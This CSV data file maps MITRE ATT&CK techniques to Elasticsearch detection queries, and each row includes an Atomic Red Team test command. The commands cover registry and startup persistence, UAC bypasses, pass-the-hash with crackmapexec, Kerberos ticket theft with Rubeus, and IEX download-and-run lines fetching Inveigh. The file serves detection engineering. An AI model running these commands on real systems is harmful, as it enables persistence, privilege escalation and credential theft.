T1546.010,"            {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""reg*""}},
                 {""match"": {""CommandLine"": ""import""}},
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",reg.exe import e764f6_T1546.010.reg,,,
T1546.011,"                         {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""sdbinst*""}},
                {""wildcard"": {""CommandLine"": ""*sdb""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",sdbinst.exe 729b9b_AtomicShimx86.sdb,,,
T1546.011,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                {""wildcard"": {""CommandLine"": ""*.sdb""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb; Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb,,2,
T1546.011,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}},
                   {""match_phrase"": {""CommandLine"": ""Windows NT\\CurrentVersion\\AppCompatFlags\\Custom""}},
                  {""match_phrase"": {""CommandLine"": ""Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB""}}

           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""; New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT",,2,
T1546.012,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                {""match_phrase"": {""CommandLine"": ""Windows NT\\CurrentVersion\\Image""}},
                {""match"": {""CommandLine"": ""Debugger""}},
                {""match"": {""CommandLine"": ""Options""}}
                            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v Debugger /d ""#{payload_binary}""",,2,
T1546.012,"
{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                  {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                   {""match_phrase"":{""CommandLine"": ""Windows NT\\CurrentVersion""}},
                  
                          
                ]
     }
    },
    {""bool"":{
     ""should"":[ 
                {""match"": {""CommandLine"": ""GlobalFlag""}},
                {""match"": {""CommandLine"": ""MonitorProcess""}},
                {""match"": {""CommandLine"": ""ReportingMode""}}
                     ]
     }
    }
                 ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v GlobalFlag /t REG_DWORD /d 512 
&& REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v ReportingMode /t REG_DWORD /d 1 
&& REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v MonitorProcess /d ""#{payload_binary}""",2,,
T1546.013,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Add-Content""}},
                {""match_phrase"": {""CommandLine"": ""Start-Process""}},
                {""match"": {""CommandLine"": ""powershell""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Add-Content $profile -Value """"; Add-Content $profile -Value ""Start-Process calc.exe""; powershell -Command exit",2,,
T1546.015,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""New-Item""}},
                {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}},
                 {""match_phrase"": {""CommandLine"": ""Classes\\CLSID\\""}},
                {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'; New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Value $env:TEMP\AtomicTest.dll; New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType ""String""; Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'",,,
T1546.015,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.Document.Application.ShellExecute""}},
                {""match_phrase"": {""CommandLine"": ""GetTypeFromCLSID""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(""9BA05972-F6A8-11CF-A442-00A0C90A8F39"")); $item = $o.Item(); $item.Document.Application.ShellExecute(""cmd.exe"",""/c calc.exe"",""C:\windows\system32"",$null,0)",2,,
T1547,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""add-driver""}},
                 {""wildcard"": {""CommandLine"": ""*.inf""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","pnputil.exe /add-driver ""C:\Windows\INF\usbstor.inf""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""WScript.Shell""}},
                {""wildcard"": {""CommandLine"": ""*CreateShortcut""}},
                {""wildcard"": {""CommandLine"": ""*TargetPath""}},
                 {""wildcard"": {""CommandLine"": ""calc*""}},
                 {""wildcard"": {""CommandLine"": ""*.Save""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$Target = ""C:\Windows\System32\calc.exe""; 
$ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk""; 
$WScriptShell = New-Object -ComObject WScript.Shell; 
$Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                 {""match_phrase"": {""CommandLine"": ""shell\\open\\command""}}
               ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""set-itemproperty""}},
                 {""match"": {""CommandLine"": ""IEX""}},
                {""wildcard"": {""CommandLine"": ""*.bat""}}
               ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$RunOnceKey = ""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce""; set-itemproperty $RunOnceKey ""NextRun"" 'powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`"")""'",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                {""wildcard"": {""CommandLine"": ""*.exe""}},
                 {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\CurrentVersion\\Run""}}
               ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                
                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\CurrentVersion""}},
                {""wildcard"": {""CommandLine"": ""*.dll""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                 {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\Start Menu\\Programs\\Startup""}},
                {""wildcard"": {""CommandLine"": ""*.bat""}},
                {""match_phrase"":{""CommandLine"": ""Start-Process""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Copy-Item bea90a_batstartup.bat ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""; 
Copy-Item bea90a_batstartup.bat ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""; 
Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""; 
Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                  {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\Start Menu\\Programs\\Startup""}},
                {""wildcard"": {""CommandLine"": ""*jse""}},
                {""wildcard"": {""CommandLine"": ""cscript*""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Copy-Item d2a901_jsestartup.jse ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""; 
Copy-Item d2a901_jsestartup.jse ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"";
 cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""; 
cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\Start Menu\\Programs\\Startup""}},
                {""wildcard"": {""CommandLine"": ""*vbs""}},
                {""wildcard"": {""CommandLine"": ""cscript*""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Copy-Item b6dec5_vbsstartup.vbs ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"";
Copy-Item b6dec5_vbsstartup.vbs ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""; 
cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"";
 cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""",2,,
T1547.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""Windows\\CurrentVersion\\Run""}},
                        {""match_phrase"":{""CommandLine"": ""Set-ItemProperty""}}
       ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""hidden""}},
                        {""match"": {""CommandLine"": ""Bypass""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$RunKey = ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run""; 
Set-ItemProperty -Path $RunKey -Name ""socks5_powershell"" -Value ""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File""",2,,
T1547.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""REG_MULTI_SZ""}},
                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\Lsa""}},
                {""wildcard"": {""CommandLine"": ""*dll""}},
                {""wildcard"": {""CommandLine"": ""reg*""}},
                 {""match"": {""CommandLine"": ""add""}},
                  {""match"": {""CommandLine"": ""Copy-Item""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Copy-Item 864d47_package.dll C:\Windows\System32\; 
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f",2,,
T1547.004,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify""}},
                 {""match"": {""CommandLine"": ""logon""}},
                {""wildcard"": {""CommandLine"": ""*dll""}}              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" -Force; 
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" ""logon"" ""C:\Windows\Temp\atomicNotificationPackage.dll"" -Force",2,,
T1547.004,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Winlogon""}},
                  {""match_phrase"": {""CommandLine"": ""Windows\\System32\\cmd.exe""}},
                {""match"": {""CommandLine"": ""Shell""}} ,
                               ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\""
""Shell"" ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force",2,,
T1547.005,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                   {""match_phrase"": {""CommandLine"":""Security Packages""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'; $SecurityPackagesUpdated = $SecurityPackages; $SecurityPackagesUpdated += ""not-a-ssp""; 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated; 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages",2,,
T1547.009,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*lnk""}},
                {""wildcard"": {""CommandLine"": ""*CreateShortcut""}},
                {""wildcard"": {""CommandLine"": ""*TargetPath""}},
                 {""wildcard"": {""CommandLine"": ""*WorkingDirectory""}},
                 {""wildcard"": {""CommandLine"": ""*Save""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$Shell = New-Object -ComObject (""WScript.Shell"");
$ShortCut = $Shell.CreateShortcut(""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk""); 
$ShortCut.TargetPath=""cmd.exe""; $ShortCut.WorkingDirectory = ""C:\Windows\System32""; $ShortCut.WindowStyle = 1; 
$ShortCut.Description = ""T1547.009.""; $ShortCut.Save(); $Shell = New-Object -ComObject (""WScript.Shell""); $ShortCut = $Shell.CreateShortcut(""$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk"");
 $ShortCut.TargetPath=""cmd.exe""; $ShortCut.WorkingDirectory = ""C:\Windows\System32""; $ShortCut.WindowStyle = 1; 
$ShortCut.Description = ""T1547.009.""; $ShortCut.Save()",0,,
T1547.009,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""echo""}},
                {""match"": {""CommandLine"": ""&gt;""}},
                {""wildcard"": {""CommandLine"":""*.url""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","echo [InternetShortcut] > %temp%\T1547.009_modified_shortcut.url && echo URL=C:\windows\system32\calc.exe 
>> %temp%\T1547.009_modified_shortcut.url && %temp%\T1547.009_modified_shortcut.url",2,,
T1547.010,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                
                 {""wildcard"": {""CommandLine"": ""*dll""}},
                  {""match_phrase"": {""CommandLine"": ""\\currentcontrolset\\control\\print\\monitors\\ART""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg add ""hklm\system\currentcontrolset\control\print\monitors\ART"" /v ""Atomic Red Team"" /d ""C:\Path\AtomicRedTeam.dll"" /t REG_SZ",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""mkdir""}},
                {""match"": {""CommandLine"": ""copy""}},
                {""match"": {""CommandLine"": ""mklink""}},
                {""wildcard"": {""CommandLine"": ""*.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","mkdir ""\\?\C:\Windows \System32\"" && copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" 
&& mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""",2,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.exe""}},
                  {""match_phrase"": {""CommandLine"": ""classes\\mscfile\\shell\\open\\command""}},
                {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force; 
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force; 
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; 
Start-Process ""C:\Windows\System32\ComputerDefaults.exe""",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""classes\\mscfile\\shell\\open\\command""}},
                {""match_phrase"": {""CommandLine"": ""eventvwr.msc""}},
                    {""match_phrase"": {""CommandLine"": ""Set-ItemProperty""}}
    ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force;
 Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; 
Start-Process ""C:\Windows\System32\eventvwr.msc""",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""reg*""}},
                  {""wildcard"": {""CommandLine"": ""add""}},
                {""match_phrase"": {""CommandLine"": ""eventvwr.msc""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f 
&& cmd.exe /c eventvwr.msc",2,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""reg*""}},
                    {""match"": {""CommandLine"": ""add""}},
               {""match_phrase"": {""CommandLine"": ""\\classes\\ms-settings\\shell\\open\\command""}},
                {""match"": {""CommandLine"": ""DelegateExecute""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f && reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f && fodhelper.exe",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
               {""match_phrase"": {""CommandLine"":""Classes\\Folder\\shell\\open\\command""}}, 
                  {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force; 
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force; 
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; 
Start-Process ""C:\Windows\System32\fodhelper.exe""",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"":""Classes\\Folder\\shell\\open\\command""}}, 
                {""match_phrase"": {""CommandLine"": ""Start-Process""}},
                {""match_phrase"": {""CommandLine"": ""sdclt.exe""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Value 'cmd.exe /c notepad.exe';
 New-ItemProperty -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute""; 
Start-Process -FilePath $env:windir\system32\sdclt.exe; Start-Sleep -s 3",2,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""reg*""}},
                {""match"": {""CommandLine"": ""ADD""}},
                {""match_phrase"": {""CommandLine"": ""EnableLUA""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f,2,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": "" Akagi64""}},
                {""match_phrase"": {""CommandLine"": "" \\uacme\\23""}}   
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","""%temp%\uacme\23 Akagi64.exe""",2,,
T1550.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""crackmapexec*""}},
                {""match"": {""CommandLine"": ""Administrator""}},
                {""match"": {""CommandLine"": ""whoami""}}
                
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\CrackMapExecWin\crackmapexec.exe %userdnsdomain% -u 
Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami",2,,
T1550.003,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""ticket.kirbi""}},
                 {""match"": {""CommandLine"": ""ptt""}},
                {""match_phrase"": {""CommandLine"": ""Move-Item""}}          ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\PSTools\PsExec.exe -accepteula \\localhost -w c:\ -c $Env:TEMP\rubeus.exe asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi; 
Set-Location $env:TEMP; 
Move-Item -Force ""\\localhost\c$\ticket.kirbi"" ticket.kirbi; 
Write-Host ""Successfully retrieved TGT from 'localhost', now requesting a TGS from local""; 
& ""$Env:TEMP\rubeus.exe"" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt;
 Remove-Item $env:TEMP\ticket.kirbi; & ""$Env:TEMP\rubeus.exe"" purge",2,,
T1556.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                {""match"": {""CommandLine"": ""-Destination""}},
                {""match"": {""CommandLine"": ""-PassThru""}},
                {""wildcard"": {""CommandLine"": ""*basename""}},
                {""match_phrase"": {""CommandLine"": ""Restart-Computer""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$passwordFilterName = (Copy-Item ""PathToAtomicsFolder\T1556.002\src\AtomicPasswordFilter.dll"" -Destination ""C:\Windows\System32"" -PassThru).basename; 
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""; 
$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages""); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues; Restart-Computer -Confirm",2,,
T1557.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-Inveigh""}},
                {""match"": {""CommandLine"": ""-ConsoleOutput""}},  
                 {""match"": {""CommandLine"": ""-HTTPS""}}           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",2,,
T1574.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""copy""}},
              
           
                {""match_phrase"": {""CommandLine"": ""amsi.dll""}}  
          ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe && copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll && %APPDATA%\updater.exe -Command exit,,,
T1574.009,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""copy""}},
                {""match"": {""CommandLine"": ""binpath""}},
                {""match_phrase"": {""CommandLine"": ""\\Program Files\\windows_service.exe""}},
                  {""match_phrase"": {""CommandLine"": ""sc create""}},
                {""match_phrase"": {""CommandLine"": ""sc start""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","copy 0655d1_WindowsServiceExample.exe ""C:\Program Files\windows_service.exe"" && copy 0655d1_WindowsServiceExample.exe ""C:\program.exe"" && sc create ""Example Service"" binpath= ""C:\Program Files\windows_service.exe"" Displayname= ""Example Service"" start= auto && sc start ""Example Service""",2,,
T1574.011,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""reg.exe add""}},
                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\calcservice""}},
                {""match"": {""CommandLine"": ""ImagePath""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\calcservice"" /f /v ImagePath /d ""%windir%\system32\cmd.exe""",2,,
